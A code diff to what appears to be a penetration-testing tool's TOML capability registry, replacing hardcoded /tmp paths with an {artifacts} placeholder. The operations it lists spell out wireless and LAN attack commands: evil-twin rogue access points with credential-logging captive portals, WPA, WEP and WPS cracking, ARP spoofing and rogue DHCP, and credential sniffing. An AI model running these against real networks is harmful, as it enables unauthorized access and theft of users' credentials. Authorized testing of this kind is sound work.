 name = 'Deauth Cap Hash'
-args = ['/tmp/deauth/watch-01.cap']
+args = ['{artifacts}/deauth/watch-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22889,14 +22889,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Deauth Report Build'
-args = ['deauth_report.py', '--in', '/tmp/deauth/', '--out', '/tmp/deauth_report.json']
+args = ['deauth_report.py', '--in', '{artifacts}/deauth/', '--out', '{artifacts}/deauth_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Affected Client Dedup'
-args = ['-u', '/tmp/deauth/clients.txt']
+args = ['-u', '{artifacts}/deauth/clients.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -22911,35 +22911,35 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' }
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Hostapd Conf Build'
-args = ['hostapd_gen.py', '--ssid', '{ssid}', '--channel', '6', '--out', '/tmp/et/hostapd.conf']
+args = ['hostapd_gen.py', '--ssid', '{ssid}', '--channel', '6', '--out', '{artifacts}/et/hostapd.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Hostapd Conf Review'
-args = ['/tmp/et/hostapd.conf']
+args = ['{artifacts}/et/hostapd.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hostapd'
 [[capability.provider.operation]]
 name = 'Rogue Ap Start'
-args = ['/tmp/et/hostapd.conf']
+args = ['{artifacts}/et/hostapd.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Dnsmasq Conf Build'
-args = ['dnsmasq_gen.py', '--dhcp-range', '10.0.0.10,10.0.0.100', '--out', '/tmp/et/dnsmasq.conf']
+args = ['dnsmasq_gen.py', '--dhcp-range', '10.0.0.10,10.0.0.100', '--out', '{artifacts}/et/dnsmasq.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'dnsmasq'
 [[capability.provider.operation]]
 name = 'Dhcp Dns Service Start'
-args = ['-C', '/tmp/et/dnsmasq.conf', '-d']
+args = ['-C', '{artifacts}/et/dnsmasq.conf', '-d']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22965,7 +22965,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Captive Portal Serve'
-args = ['portal_serve.py', '--port', '80', '--log', '/tmp/et/creds.log']
+args = ['portal_serve.py', '--port', '80', '--log', '{artifacts}/et/creds.log']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -22979,56 +22979,56 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Cred Log Sweep'
-args = ['-rniE', '(user(name)?|pass(word)?)[=:]', '/tmp/et/creds.log']
+args = ['-rniE', '(user(name)?|pass(word)?)[=:]', '{artifacts}/et/creds.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Client Traffic Sniff'
-args = ['-i', '{iface}', '-nn', '-w', '/tmp/et/et_traffic.pcap', '-c', '2000']
+args = ['-i', '{iface}', '-nn', '-w', '{artifacts}/et/et_traffic.pcap', '-c', '2000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Dhcp Client Extract'
-args = ['-r', '/tmp/et/et_traffic.pcap', '-Y', 'dhcp', '-T', 'fields', '-e', 'dhcp.option.hostname', '-e', 'eth.src']
+args = ['-r', '{artifacts}/et/et_traffic.pcap', '-Y', 'dhcp', '-T', 'fields', '-e', 'dhcp.option.hostname', '-e', 'eth.src']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Assoc Client Watch'
-args = ['{iface}mon', '--bssid', '{rogue_bssid}', '-w', '/tmp/et/assoc']
+args = ['{iface}mon', '--bssid', '{rogue_bssid}', '-w', '{artifacts}/et/assoc']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Traffic Cap Verify'
-args = ['/tmp/et/et_traffic.pcap']
+args = ['{artifacts}/et/et_traffic.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Et Evidence Hash'
-args = ['/tmp/et/creds.log']
+args = ['{artifacts}/et/creds.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Assoc Client Count'
-args = ['-l', '/tmp/et/clients.txt']
+args = ['-l', '{artifacts}/et/clients.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Et Report Build'
-args = ['et_report.py', '--in', '/tmp/et/', '--out', '/tmp/et_report.json']
+args = ['et_report.py', '--in', '{artifacts}/et/', '--out', '{artifacts}/et_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -23036,7 +23036,7 @@ id = 'wireless.wpa-crack'
 phase = 'wireless'
 label = 'WPA CRACK'
 summary = 'Offline WPA/WPA2-PSK cracking across hash modes'
-inputs = [ { key = 'cap', type = 'file', required = false, default = '/tmp/hs/target_hs-01.cap' }, { key = 'bssid', type = 'target', required = true } ,
+inputs = [ { key = 'cap', type = 'file', required = false, default = '{artifacts}/hs/target_hs-01.cap' }, { key = 'bssid', type = 'target', required = true } ,
   { key = 'ssid', type = 'text', required = false }
 ]
 [[capability.provider]]
@@ -23053,50 +23053,50 @@ output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Ssid Wordlist Gen Crack'
-args = ['-b', '{bssid}', '{cap}', '-w', '/tmp/ssid_wordlist.txt']
+args = ['-b', '{bssid}', '{cap}', '-w', '{artifacts}/ssid_wordlist.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'crunch'
 [[capability.provider.operation]]
 name = 'Ssid Pattern Wordlist Build'
-args = ['8', '12', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '/tmp/ssid_wordlist.txt']
+args = ['8', '12', 'abcdefghijklmnopqrstuvwxyz0123456789', '-o', '{artifacts}/ssid_wordlist.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
 name = 'Cap To 22000 Convert'
-args = ['-o', '/tmp/hs/wpa.22000', '{cap}']
+args = ['-o', '{artifacts}/hs/wpa.22000', '{cap}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hashcat'
 [[capability.provider.operation]]
 name = '22000 Straight Crack'
-args = ['-m', '22000', '-a', '0', '/tmp/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{artifacts}/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = '22000 Rule Crack'
-args = ['-m', '22000', '-a', '0', '/tmp/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/dive.rule}', '--potfile-disable']
+args = ['-m', '22000', '-a', '0', '{artifacts}/hs/wpa.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/dive.rule}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = '22000 Mask Crack'
-args = ['-m', '22000', '-a', '3', '/tmp/hs/wpa.22000', '?l?l?l?l?l?d?d?d?d', '--potfile-disable']
+args = ['-m', '22000', '-a', '3', '{artifacts}/hs/wpa.22000', '?l?l?l?l?l?d?d?d?d', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = '16800 Pmkid Crack'
-args = ['-m', '16800', '-a', '0', '/tmp/pmkid.16800', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+args = ['-m', '16800', '-a', '0', '{artifacts}/pmkid.16800', '{wl:passwords/rockyou.txt}', '--potfile-disable']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'john'
 [[capability.provider.operation]]
 name = 'John 22000 Crack'
-args = ['--format=wpapsk', '--wordlist={wl:passwords/rockyou.txt}', '/tmp/hs/wpapsk.john']
+args = ['--format=wpapsk', '--wordlist={wl:passwords/rockyou.txt}', '{artifacts}/hs/wpapsk.john']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23124,28 +23124,28 @@ network = false
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Crack Evidence Hash'
-args = ['/tmp/hs/wpa.22000']
+args = ['{artifacts}/hs/wpa.22000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Crack Report Build'
-args = ['wpa_crack_report.py', '--in', '/tmp/hs/wpa.22000', '--out', '/tmp/wpa_crack.json']
+args = ['wpa_crack_report.py', '--in', '{artifacts}/hs/wpa.22000', '--out', '{artifacts}/wpa_crack.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Cracked Password Review'
-args = ['/tmp/wpa_cracked.txt']
+args = ['{artifacts}/wpa_cracked.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Candidate List Dedup'
-args = ['-u', '/tmp/ssid_wordlist.txt']
+args = ['-u', '{artifacts}/ssid_wordlist.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -23160,7 +23160,7 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Wep Ivs Capture'
-args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/wep/ivs_cap', '--write-interval', '2']
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '{artifacts}/wep/ivs_cap', '--write-interval', '2']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23184,63 +23184,63 @@ network = false
 binary = 'packetforge-ng'
 [[capability.provider.operation]]
 name = 'Forged Arp Build'
-args = ['-0', '-a', '{bssid}', '-h', '{ourmac}', '-j', '63', '-g', '63', '-l', '255', '-w', '/tmp/wep/arp.pcap']
+args = ['-0', '-a', '{bssid}', '-h', '{ourmac}', '-j', '63', '-g', '63', '-l', '255', '-w', '{artifacts}/wep/arp.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'aireplay-ng'
 [[capability.provider.operation]]
 name = 'Forged Arp Inject'
-args = ['-2', '-r', '/tmp/wep/arp.pcap', '{iface}']
+args = ['-2', '-r', '{artifacts}/wep/arp.pcap', '{iface}']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Ptw Statistic Crack'
-args = ['-K', '/tmp/wep/ivs_cap-01.cap']
+args = ['-K', '{artifacts}/wep/ivs_cap-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'aircrack-ng'
 [[capability.provider.operation]]
 name = 'Fms Korek Crack'
-args = ['-b', '{bssid}', '/tmp/wep/ivs_cap-01.cap']
+args = ['-b', '{bssid}', '{artifacts}/wep/ivs_cap-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Iv Count Progress'
-args = ['-l', '/tmp/wep/ivs_cap-01.csv']
+args = ['-l', '{artifacts}/wep/ivs_cap-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Data Frame Count Extract'
-args = ['-oE', '#[0-9]+', '/tmp/wep/ivs_cap-01.csv']
+args = ['-oE', '#[0-9]+', '{artifacts}/wep/ivs_cap-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Ivs Cap Verify'
-args = ['/tmp/wep/ivs_cap-01.cap']
+args = ['{artifacts}/wep/ivs_cap-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Wep Evidence Hash'
-args = ['/tmp/wep/ivs_cap-01.cap']
+args = ['{artifacts}/wep/ivs_cap-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Iv Rate Monitor'
-args = ['iv_monitor.py', '--in', '/tmp/wep/ivs_cap-01.csv']
+args = ['iv_monitor.py', '--in', '{artifacts}/wep/ivs_cap-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23254,14 +23254,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Wep Report Build'
-args = ['wep_report.py', '--in', '/tmp/wep/', '--out', '/tmp/wep_report.json']
+args = ['wep_report.py', '--in', '{artifacts}/wep/', '--out', '{artifacts}/wep_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Recovered Key Review'
-args = ['/tmp/wep/key.txt']
+args = ['{artifacts}/wep/key.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23321,12 +23321,12 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Wps Pin Extract'
-args = ['-oE', 'WPS PIN:\\s+[0-9]+', '/tmp/wps/reaver.log']
+args = ['-oE', 'WPS PIN:\\s+[0-9]+', '{artifacts}/wps/reaver.log']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Locked Ap Marker Hunt'
-args = ['-iE', 'locked|rate limit', '/tmp/wps/reaver.log']
+args = ['-iE', 'locked|rate limit', '{artifacts}/wps/reaver.log']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23340,35 +23340,35 @@ network = false
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Wps Session Monitor'
-args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/wps/monitor']
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '{artifacts}/wps/monitor']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Eap Wps Message Filter'
-args = ['-r', '/tmp/wps/monitor-01.cap', '-Y', 'eap', '-T', 'fields', '-e', 'eap.type', '-e', 'eap.code']
+args = ['-r', '{artifacts}/wps/monitor-01.cap', '-Y', 'eap', '-T', 'fields', '-e', 'eap.type', '-e', 'eap.code']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Wps Log Verify'
-args = ['/tmp/wps/reaver.log']
+args = ['{artifacts}/wps/reaver.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Wps Evidence Hash'
-args = ['/tmp/wps/reaver.log']
+args = ['{artifacts}/wps/reaver.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Pin Attempt Count'
-args = ['-l', '/tmp/wps/attempts.txt']
+args = ['-l', '{artifacts}/wps/attempts.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23382,14 +23382,14 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Wps Report Build'
-args = ['wps_report.py', '--in', '/tmp/wps/', '--out', '/tmp/wps_report.json']
+args = ['wps_report.py', '--in', '{artifacts}/wps/', '--out', '{artifacts}/wps_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Recovered Pin Review'
-args = ['/tmp/wps/pin.txt']
+args = ['{artifacts}/wps/pin.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -23402,12 +23402,12 @@ inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Sae Commit Extract'
-args = ['-r', '/tmp/wpa3/sae.pcap', '-Y', 'wlan.rsn.akms==00-0f-ac-8', '-T', 'fields', '-e', 'wlan.sa']
+args = ['-r', '{artifacts}/wpa3/sae.pcap', '-Y', 'wlan.rsn.akms==00-0f-ac-8', '-T', 'fields', '-e', 'wlan.sa']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Pmf Required Check'
-args = ['-r', '/tmp/wpa3/sae.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-Y', 'wlan.fc.type_subtype==8']
+args = ['-r', '{artifacts}/wpa3/sae.pcap', '-T', 'fields', '-e', 'wlan.rsn.capabilities', '-Y', 'wlan.fc.type_subtype==8']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23433,77 +23433,77 @@ network = false
 binary = 'airodump-ng'
 [[capability.provider.operation]]
 name = 'Wpa3 Beacon Capture'
-args = ['{iface}', '--bssid', '{bssid}', '-w', '/tmp/wpa3/beacons']
+args = ['{iface}', '--bssid', '{bssid}', '-w', '{artifacts}/wpa3/beacons']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Rsn Sae Marker Hunt'
-args = ['-iE', 'SAE|PMF|wpa3', '/tmp/wpa3/beacons-01.csv']
+args = ['-iE', 'SAE|PMF|wpa3', '{artifacts}/wpa3/beacons-01.csv']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'hostapd'
 [[capability.provider.operation]]
 name = 'Wpa3 Test Ap Spawn'
-args = ['/tmp/wpa3/test_ap.conf']
+args = ['{artifacts}/wpa3/test_ap.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Wpa3 Ap Conf Build'
-args = ['hostapd_wpa3_gen.py', '--ssid', 'TS-WPA3-TEST', '--out', '/tmp/wpa3/test_ap.conf']
+args = ['hostapd_wpa3_gen.py', '--ssid', 'TS-WPA3-TEST', '--out', '{artifacts}/wpa3/test_ap.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wpa_supplicant'
 [[capability.provider.operation]]
 name = 'Sae Client Connect Test'
-args = ['-i', 'wlan0', '-c', '/tmp/wpa3/sae_client.conf']
+args = ['-i', 'wlan0', '-c', '{artifacts}/wpa3/sae_client.conf']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Wpa3 Cap Verify'
-args = ['/tmp/wpa3/beacons-01.cap']
+args = ['{artifacts}/wpa3/beacons-01.cap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Wpa3 Evidence Hash'
-args = ['/tmp/wpa3/sae.pcap']
+args = ['{artifacts}/wpa3/sae.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Sae Frame Count'
-args = ['-l', '/tmp/wpa3/sae_frames.txt']
+args = ['-l', '{artifacts}/wpa3/sae_frames.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Sae Peer Dedup'
-args = ['-u', '/tmp/wpa3/peers.txt']
+args = ['-u', '{artifacts}/wpa3/peers.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Wpa3 Report Build'
-args = ['wpa3_report.py', '--in', '/tmp/wpa3/', '--out', '/tmp/wpa3_report.json']
+args = ['wpa3_report.py', '--in', '{artifacts}/wpa3/', '--out', '{artifacts}/wpa3_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'cat'
 [[capability.provider.operation]]
 name = 'Probe Result Review'
-args = ['/tmp/wpa3/results.txt']
+args = ['{artifacts}/wpa3/results.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -23576,56 +23576,56 @@ network = false
 binary = 'btmon'
 [[capability.provider.operation]]
 name = 'Hci Traffic Monitor'
-args = ['-w', '/tmp/bt/btmon.log']
+args = ['-w', '{artifacts}/bt/btmon.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Bt Frames Extract'
-args = ['-r', '/tmp/bt/bt_capture.pcap', '-Y', 'bluetooth.hci_h4', '-T', 'fields', '-e', 'bluetooth.src', '-e', 'bluetooth.dst']
+args = ['-r', '{artifacts}/bt/bt_capture.pcap', '-Y', 'bluetooth.hci_h4', '-T', 'fields', '-e', 'bluetooth.src', '-e', 'bluetooth.dst']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Spp Service Marker'
-args = ['-iE', 'Serial Port|OBEX|Headset', '/tmp/bt/sdp.txt']
+args = ['-iE', 'Serial Port|OBEX|Headset', '{artifacts}/bt/sdp.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Bt Device Dedup'
-args = ['-u', '/tmp/bt/devices.txt']
+args = ['-u', '{artifacts}/bt/devices.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Bt Device Count'
-args = ['-l', '/tmp/bt/devices.txt']
+args = ['-l', '{artifacts}/bt/devices.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Bt Capture Verify'
-args = ['/tmp/bt/bt_capture.pcap']
+args = ['{artifacts}/bt/bt_capture.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Bt Evidence Hash'
-args = ['/tmp/bt/btmon.log']
+args = ['{artifacts}/bt/btmon.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Bt Report Build'
-args = ['bt_report.py', '--in', '/tmp/bt/devices.txt', '--out', '/tmp/bt_report.json']
+args = ['bt_report.py', '--in', '{artifacts}/bt/devices.txt', '--out', '{artifacts}/bt_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -23681,68 +23681,68 @@ network = false
 binary = 'btmon'
 [[capability.provider.operation]]
 name = 'Ble Traffic Monitor'
-args = ['-w', '/tmp/ble/btmon.log']
+args = ['-w', '{artifacts}/ble/btmon.log']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Adv Data Extract'
-args = ['-r', '/tmp/ble/ble.pcap', '-Y', 'btcommon.eir_ad.entry.device_name', '-T', 'fields', '-e', 'btcommon.eir_ad.entry.device_name']
+args = ['-r', '{artifacts}/ble/ble.pcap', '-Y', 'btcommon.eir_ad.entry.device_name', '-T', 'fields', '-e', 'btcommon.eir_ad.entry.device_name']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Ibeacon Marker Hunt'
-args = ['-oE', '4c00[0-9a-f]+', '/tmp/ble/btmon.log']
+args = ['-oE', '4c00[0-9a-f]+', '{artifacts}/ble/btmon.log']
 output = 'lines'
 network = false
 [[capability.provider.operation]]
 name = 'Uart Service Marker'
-args = ['-iE', '6e400001|nordic|uart', '/tmp/ble/gatt.txt']
+args = ['-iE', '6e400001|nordic|uart', '{artifacts}/ble/gatt.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Ble Adv Parse'
-args = ['ble_parse.py', '--in', '/tmp/ble/btmon.log', '--out', '/tmp/ble/devices.json']
+args = ['ble_parse.py', '--in', '{artifacts}/ble/btmon.log', '--out', '{artifacts}/ble/devices.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Ble Device Dedup'
-args = ['-u', '/tmp/ble/devices.txt']
+args = ['-u', '{artifacts}/ble/devices.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Ble Device Count'
-args = ['-l', '/tmp/ble/devices.txt']
+args = ['-l', '{artifacts}/ble/devices.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Ble Capture Verify'
-args = ['/tmp/ble/ble.pcap']
+args = ['{artifacts}/ble/ble.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Ble Evidence Hash'
-args = ['/tmp/ble/devices.json']
+args = ['{artifacts}/ble/devices.json']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Ble Report Build'
-args = ['ble_report.py', '--in', '/tmp/ble/devices.json', '--out', '/tmp/ble_report.json']
+args = ['ble_report.py', '--in', '{artifacts}/ble/devices.json', '--out', '{artifacts}/ble_report.json']
 output = 'json'
 network = false
 [[capability]]
@@ -23816,56 +23816,56 @@ network = false
 binary = 'tcpdump'
 [[capability.provider.operation]]
 name = 'Portal Traffic Capture'
-args = ['-i', '{iface}', '-nn', '-w', '/tmp/portal/portal.pcap', '-c', '1000']
+args = ['-i', '{iface}', '-nn', '-w', '{artifacts}/portal/portal.pcap', '-c', '1000']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
 name = 'Redirect 302 Extract'
-args = ['-r', '/tmp/portal/portal.pcap', '-Y', 'http.response.code==302', '-T', 'fields', '-e', 'http.location']
+args = ['-r', '{artifacts}/portal/portal.pcap', '-Y', 'http.response.code==302', '-T', 'fields', '-e', 'http.location']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Portal Token Sweep'
-args = ['-rnoiE', '(token|session|auth)[=:][a-z0-9]+', '/tmp/portal/']
+args = ['-rnoiE', '(token|session|auth)[=:][a-z0-9]+', '{artifacts}/portal/']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Portal Cap Verify'
-args = ['/tmp/portal/portal.pcap']
+args = ['{artifacts}/portal/portal.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Portal Evidence Hash'
-args = ['/tmp/portal/portal.pcap']
+args = ['{artifacts}/portal/portal.pcap']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Bypass Attempt Count'
-args = ['-l', '/tmp/portal/attempts.txt']
+args = ['-l', '{artifacts}/portal/attempts.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Portal Report Build'
-args = ['portal_report.py', '--in', '/tmp/portal/', '--out', '/tmp/portal_report.json']
+args = ['portal_report.py', '--in', '{artifacts}/portal/', '--out', '{artifacts}/portal_report.json']
 output = 'json'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Bypass Method Dedup'
-args = ['-u', '/tmp/portal/methods.txt']
+args = ['-u', '{artifacts}/portal/methods.txt']
 output = 'lines'
 network = false
 [[capability]]
@@ -23913,7 +23913,7 @@ network = false
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Arp Spoof Gw Pivot'
-args = ['arp_spoof.py', '--iface', '{iface}', '--gw', '{gw}', '--victims', '/tmp/rd/victims.txt']
+args = ['arp_spoof.py', '--iface', '{iface}', '--gw', '{gw}', '--victims', '{artifacts}/rd/victims.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23927,7 +23927,7 @@ network = false
 binary = 'dnsmasq'
 [[capability.provider.operation]]
 name = 'Rogue Dhcp Serve Start'
-args = ['-C', '/tmp/rd/dnsmasq.conf', '-d', '--no-daemon']
+args = ['-C', '{artifacts}/rd/dnsmasq.conf', '-d', '--no-daemon']
 output = 'lines'
 network = false
 [[capability.provider]]
@@ -23941,56 +23941,56 @@ network = false
 binary = 'grep'
 [[capability.provider.operation]]
 name = 'Multiple Dhcp Server Hunt'
-args = ['-iE', 'offer|ack', '/tmp/rd/dhcp_capture.txt']
+args = ['-iE', 'offer|ack', '{artifacts}/rd/dhcp_capture.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sort'
 [[capability.provider.operation]]
 name = 'Dhcp Server Dedup'
-args = ['-u', '/tmp/rd/servers.txt']
+args = ['-u', '{artifacts}/rd/servers.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'wc'
 [[capability.provider.operation]]
 name = 'Dhcp Offer Count'
-args = ['-l', '/tmp/rd/servers.txt']
+args = ['-l', '{artifacts}/rd/servers.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'file'
 [[capability.provider.operation]]
 name = 'Rd Capture Verify'
-args = ['/tmp/rd/dhcp_capture.txt']
+args = ['{artifacts}/rd/dhcp_capture.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'sha256sum'
 [[capability.provider.operation]]
 name = 'Rd Evidence Hash'
-args = ['/tmp/rd/dhcp_capture.txt']
+args = ['{artifacts}/rd/dhcp_capture.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Cred Sniff From Pivot'
-args = ['cred_sniff.py', '--iface', '{iface}', '--out', '/tmp/rd/creds.txt']
+args = ['cred_sniff.py', '--iface', '{iface}', '--out', '{artifacts}/rd/creds.txt']
 output = 'lines'
 network = false
 [[capability.provider]]
 binary = 'python3'
 [[capability.provider.operation]]
 name = 'Rd Report Build'
-args = ['rd_report.py', '--in', '/tmp/rd/', '--out', '/tmp/rd_report.json']
